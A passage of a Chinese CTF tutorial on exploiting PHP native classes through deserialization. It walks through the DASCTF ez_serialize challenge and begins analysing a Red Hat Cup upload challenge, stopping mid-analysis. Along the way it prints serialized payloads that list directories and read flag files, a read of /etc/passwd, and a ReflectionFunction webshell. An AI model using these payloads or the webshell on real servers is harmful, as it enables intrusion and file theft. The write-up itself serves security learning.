<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$context</span>;</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625210845976.png" alt="image-20230625210845976"></p>
<p>但是这样也只能读取一行，要想全部读取的话还需要对文件中的每一行内容进行遍历：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">'/etc/passwd'</span>);
<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>){
    <span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>);
}
<span class="hljs-comment">//D:\labwork\phpstudy_pro\WWW\1.txt</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625211226501.png" alt="image-20230625211226501"></p>
<p><strong>[DASCTF MAR 2021]ez_serialize</strong></p>
<p>进入题目，给出源码：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> = "<span class="hljs-title">B</span>";</span>
<span class="hljs-class">        $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span> = "<span class="hljs-title">ctfer</span>";</span>
<span class="hljs-class">        <span class="hljs-title">echo</span> <span class="hljs-title">new</span>  $<span class="hljs-title">this</span>-&gt;<span class="hljs-title">class</span> ($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span>);</span>
<span class="hljs-class">    }</span>
<span class="hljs-class">    <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__wakeup</span>()    // 可以直接绕过<span class="hljs-title">__wakeup</span>()方法的执行</span>
<span class="hljs-class">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;check = <span class="hljs-keyword">new</span> C;
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;para) &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>)) {
            <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> ($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span>);</span>
<span class="hljs-class">        }</span>
<span class="hljs-class">        <span class="hljs-title">else</span></span>
<span class="hljs-class">            <span class="hljs-title">die</span>('<span class="hljs-title">bad</span> <span class="hljs-title">hacker</span>~');</span>
<span class="hljs-class">    }</span>
<span class="hljs-class"> </span>
<span class="hljs-class">}</span>
<span class="hljs-class"><span class="hljs-title">class</span> <span class="hljs-title">B</span></span>{
    <span class="hljs-keyword">var</span> <span class="hljs-variable">$a</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$a</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-variable">$a</span>;
        <span class="hljs-keyword">echo</span> (<span class="hljs-string">"hello "</span>.<span class="hljs-variable language_">$this</span>-&gt;a);
    }
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>{
 
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">vaild</span>(<span class="hljs-params"><span class="hljs-variable">$code</span></span>)</span>{
        <span class="hljs-variable">$pattern</span> = <span class="hljs-string">'/[!|@|#|$|%|^|&amp;|*|=|\'|"|:|;|?]/i'</span>;
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>, <span class="hljs-variable">$code</span>)){
            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
        }
        <span class="hljs-keyword">else</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }
}
 
 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>])){
    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'pop'</span>]);
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> A;
 
}</code></pre>
<p>这是一道PHP反序列化的题目，题目里面没有给出什么危险的函数调用，因此应该要想到是原生类的利用。留意这一段代码：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)    // 可以直接绕过<span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)方法的执行</span>
<span class="hljs-function">   </span>{
       <span class="hljs-variable language_">$this</span>-&gt;check = <span class="hljs-keyword">new</span> C;
       <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;para) &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;check-&gt;<span class="hljs-title function_ invoke__">vaild</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">class</span>)) {
           <span class="hljs-keyword">echo</span> <span class="hljs-keyword">new</span>  <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-class"><span class="hljs-keyword">class</span> ($<span class="hljs-title">this</span>-&gt;<span class="hljs-title">para</span>);</span>
<span class="hljs-class">       }</span>
<span class="hljs-class">       <span class="hljs-title">else</span></span>
<span class="hljs-class">           <span class="hljs-title">die</span>('<span class="hljs-title">bad</span> <span class="hljs-title">hacker</span>~');</span>
<span class="hljs-class">   }</span></code></pre>
<p>我们从反序列化的<code>__wakeup()</code>函数入手，看到新建了一个C的类对象，然后使用C类里面的<code>check()</code>方法对<code>$para</code>和<code>$class</code>这两个属性进行检查，看是否存在非法的字符，没有问题之后就使用<code>echo new $this-&gt;class ($this-&gt;para);</code>语句将新建类返回的内容输出。</p>
<p><strong>目录遍历类</strong></p>
<p>首先利用DirectoryIterator或FilesystemIterator类去遍历目标的Web目录：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>=<span class="hljs-string">'FilesystemIterator'</span>;    
    <span class="hljs-comment">// FilesystemIterator("/var/www/html")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>=<span class="hljs-string">"/var/www/html/"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    }
 
<span class="hljs-variable">$poc</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);</code></pre>
<p>得到payload：</p>
<pre><code class="hljs plaintext">O:1:"A":3:{s:5:"class";s:18:"FilesystemIterator";s:4:"para";s:14:"/var/www/html/";s:5:"check";N;}</code></pre>
<p>执行后得到一个文件夹 aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE</p>
<p>继续往下找:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>=<span class="hljs-string">'FilesystemIterator'</span>;    
    <span class="hljs-comment">// FilesystemIterator("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>=<span class="hljs-string">"/var/www/html/"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    }
 
<span class="hljs-variable">$poc</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);</code></pre>
<p>在这个文件夹下找到了<strong>flag.php</strong></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625212501056.png" alt="image-20230625212501056"></p>
<p><strong>文件读取类</strong></p>
<p>然后我们使用 SplFileObject 类读取flag.php就行了：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$class</span>=<span class="hljs-string">'SplFileObject'</span>;    
    <span class="hljs-comment">// SplFileObject("/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php")</span>
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$para</span>=<span class="hljs-string">"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$check</span>;
    }
 
<span class="hljs-variable">$poc</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$poc</span>);</code></pre>
<p>得到payload：</p>
<pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">"A"</span>:<span class="hljs-number">3</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"class"</span>;s:<span class="hljs-number">13</span>:<span class="hljs-string">"SplFileObject"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"para"</span>;s:<span class="hljs-number">55</span>:<span class="hljs-string">"/var/www/html/aMaz1ng_y0u_coUld_f1nd_F1Ag_hErE/flag.php"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"check"</span>;N;}</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625212559026.png" alt="image-20230625212559026"></p>
<h3 id="108-反射类reflection">10.8 反射类Reflection</h3>
<p>它可以在 PHP 运行状态中，扩展分析 PHP 程序，导出或提取出关于类、方法、属性、参数等的详细信息，包括注释。这种动态获取的信息以及动态调用对象的方法的功能称为反射API。</p>
<h4 id="reflectionmethod-类获取类方法的相关信息">ReflectionMethod 类获取类方法的相关信息</h4>
<p>ReflectionMethod 类报告了一个方法的有关信息。ReflectionMethod 类中有很多继承方法可以使用，比如这个 <code>getDocComment()</code> 方法，我们可以用它来获取类中各个函数注释内容</p>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FlagIsHere</span></span>
<span class="hljs-class"></span>{
  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 这是测试方法</span>
<span class="hljs-comment">   * flag{success}</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@return</span> int</span>
<span class="hljs-comment">   */</span>
  <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">GiveMeFlag</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">  </span>{
    <span class="hljs-keyword">return</span> <span class="hljs-number">9999</span>;
  }
}
 
<span class="hljs-variable">$ref</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionMethod</span>(<span class="hljs-string">'FlagIsHere'</span>,<span class="hljs-string">'GiveMeFlag'</span>);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$ref</span>-&gt;<span class="hljs-title function_ invoke__">getDocComment</span>());</code></pre>
<p>输出：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625213132588.png" alt="image-20230625213132588"></p>
<h4 id="reflectionclass类读取类的属性和方法名">ReflectionClass类读取类的属性和方法名</h4>
<p>ReflectionClass 类报告了一个类的有关信息。其中初始化方法能够返回类的实例。</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">ReflectionClass</span>::<span class="hljs-title function_ invoke__">__construct</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$argument</span>)</code></pre>
<ul>
<li><code>$argument</code>：既可以是包含类名的字符串（string）也可以是对象（object）。</li>
</ul>
<p>用法如下</p>
<p>example：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625213302949.png" alt="image-20230625213302949"></p>
<p>把类里面属性和方法的名字都能够显示出来。</p>
<h4 id="reflectionfunction类写webshell">ReflectionFunction类写Webshell</h4>
<p><strong>ReflectionFunction</strong> 类报告了一个函数的有关信息。其中<code>invokeArgs()</code>方法能够用来写Webshell。</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">ReflectionFunction</span>::<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span> <span class="hljs-variable">$args</span>): <span class="hljs-keyword">mixed</span></code></pre>
<ul>
<li><code>$args</code>：传递给函数的参数是一个数组，像<code>call_user_func_array()</code>的工作方式。</li>
</ul>
<p>example:</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">title</span>(<span class="hljs-params"><span class="hljs-variable">$title</span>, <span class="hljs-variable">$name</span></span>)</span>
<span class="hljs-function"></span>{
    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">"%s. %s\r\n"</span>, <span class="hljs-variable">$title</span>, <span class="hljs-variable">$name</span>);
}
 
<span class="hljs-variable">$function</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-string">'title'</span>);
 
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$function</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">'Dr'</span>, <span class="hljs-string">'Phil'</span>));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625213625905.png" alt="image-20230625213625905"></p>
<p>我们可以使用这个方法来写Webshell：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
    <span class="hljs-variable">$func</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReflectionFunction</span>(<span class="hljs-variable">$_GET</span>[m]);
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[c]));
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625213847803.png" alt="image-20230625213847803"></p>
<p><strong>[红帽杯 2021 final]upload</strong></p>
<p>由于线下是AWDplus的模式，需要挖洞并且修洞，直接给出了源码，有3个文件。</p>
<p>class.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">session_start</span>();
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">red</span>(<span class="hljs-params"><span class="hljs-variable">$fileinfo</span></span>)</span>{
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$fileinfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>){
        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$value</span>;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$key</span>;
    }
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;a style='color:#ff6347' href='<span class="hljs-subst">$path</span>'&gt;<span class="hljs-subst">$name</span>&lt;/a&gt;\n"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
}
 
<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">green</span>(<span class="hljs-params"><span class="hljs-variable">$fileinfo</span></span>)</span>{
    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$fileinfo</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>){
        <span class="hljs-variable">$path</span> = <span class="hljs-variable">$value</span>;
        <span class="hljs-variable">$name</span> = <span class="hljs-variable">$key</span>;
    }
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;a style='color:#32cd32' href='<span class="hljs-subst">$path</span>'&gt;<span class="hljs-subst">$name</span>&lt;/a&gt;\n"</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$name</span>;
}
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">file</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$path</span>;
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$path</span></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-variable language_">$this</span>-&gt;path = <span class="hljs-variable">$path</span>;
    }
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>
<span class="hljs-function">    </span>{
        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$this</span>-&gt;path);
    }
}</code></pre>
<p>index.php</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 
<span class="hljs-keyword">include</span>(<span class="hljs-string">'class.php'</span>);
<span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>]))) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>] = <span class="hljs-string">'showfile'</span>;
}
<span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>]))) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>] = <span class="hljs-keyword">array</span>();
}
<span class="hljs-keyword">if</span>(!(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>]))) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] = <span class="hljs-keyword">array</span>();
}
 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>], <span class="hljs-string">'h'</span>)){
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no h!'</span>);
    }
    <span class="hljs-variable">$filepath</span> = <span class="hljs-string">'./files/'</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];          
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>]);           
    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filepath</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>]);
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$filename</span>] = <span class="hljs-variable">$filepath</span>;    
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>][<span class="hljs-variable">$filepath</span>] = <span class="hljs-string">'file'</span>;        
    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">'Location:/?file='</span>.<span class="hljs-variable">$filename</span>);
 
}
<span class="hljs-meta">?&gt;</span>
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;upload&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;div&gt;
    &lt;h3&gt;upload your file below&lt;/h3&gt;
    &lt;form action=<span class="hljs-string">"index.php"</span> method=<span class="hljs-string">"post"</span>&gt;
        &lt;input type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"filename"</span> value=<span class="hljs-string">"filename"</span> style=<span class="hljs-string">"width: 600px;"</span>&gt;
        &lt;/br&gt;
        &lt;/br&gt;
        &lt;textarea type=<span class="hljs-string">"text"</span> name=<span class="hljs-string">"content"</span> style=<span class="hljs-string">"width: 600px;height: 300px;"</span> &gt;&lt;/textarea&gt;
        &lt;/br&gt;
 
        &lt;input type=<span class="hljs-string">"submit"</span> value=<span class="hljs-string">"submit"</span>&gt;
    &lt;/form&gt;
    &lt;h4&gt;beatiful front&lt;/h4&gt;
&lt;/div&gt;
<span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)&gt;<span class="hljs-number">1</span>){
    <span class="hljs-variable">$showfile</span> = <span class="hljs-string">'red'</span>;
}
<span class="hljs-keyword">else</span>{
    <span class="hljs-variable">$showfile</span> =<span class="hljs-string">'green'</span>;
}
<span class="hljs-variable">$filelist</span> = <span class="hljs-keyword">array</span>();
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'paths'</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span>=&gt;<span class="hljs-variable">$class</span>){          
    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-variable">$class</span>(<span class="hljs-variable">$path</span>);          
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$class</span>==<span class="hljs-string">'file'</span>){            
        <span class="hljs-variable">$filelist</span>[] = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$temp</span>;    
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-variable">$filelist</span>[] = <span class="hljs-variable">$temp</span>;
    }
}
<span class="hljs-variable">$out</span> = <span class="hljs-string">'&lt;p&gt;your file:'</span>;
 
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$filelist</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>){
    <span class="hljs-variable">$out</span> .= <span class="hljs-variable">$value</span>.<span class="hljs-string">' '</span>;         
}
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$out</span>.<span class="hljs-string">'&lt;/p&gt;'</span>;
 
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]])) {      <span class="hljs-comment">//GET方法读取文件名，从session的文件名字里面寻找</span>
 
        <span class="hljs-variable">$pathinfo</span> = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]=&gt;<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'files'</span>][<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>]]);
        ${<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'func'</span>]}(<span class="hljs-variable">$pathinfo</span>);
    }
    <span class="hljs-keyword">else</span>{
        <span class="hljs-keyword">echo</span> <span class="hljs-string">'no such file!'</span>;
    }
}
<span class="hljs-meta">?&gt;</span>
&lt;/body&gt;
&lt;/html&gt;</code></pre>
<p>info.php</p>
<pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">phpinfo</span>();</code></pre>
<p><strong>分析题目</strong></p>
<p>首先是index页面</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625220645325.png" alt="image-20230625220645325"></p>
<p>这里能够让用户填写文件的文件名和内容，然后提交，提交的文件正常情况下会保存在<code>./files</code>目录下，看一下后台是怎么对文件进行操作的：</p>
<pre><code class="hljs PHP"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'content'</span>])){
    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>], <span class="hljs-string">'h'</span>)){            <span class="hljs-comment">// 对文件名有h字符的进行过滤</span>
        <span class="hljs-keyword">die</span>(<span class="hljs-string">'no h!'</span>);
    }
    <span class="hljs-variable">$filepath</span> = <span class="hljs-string">'./files/'</span>.<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>];      <span class="hljs-comment">// 这里可以目录穿越</span>
    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'filename'</span>]);       <span class="hljs-comment">// basename()函数获取文件名字</span>
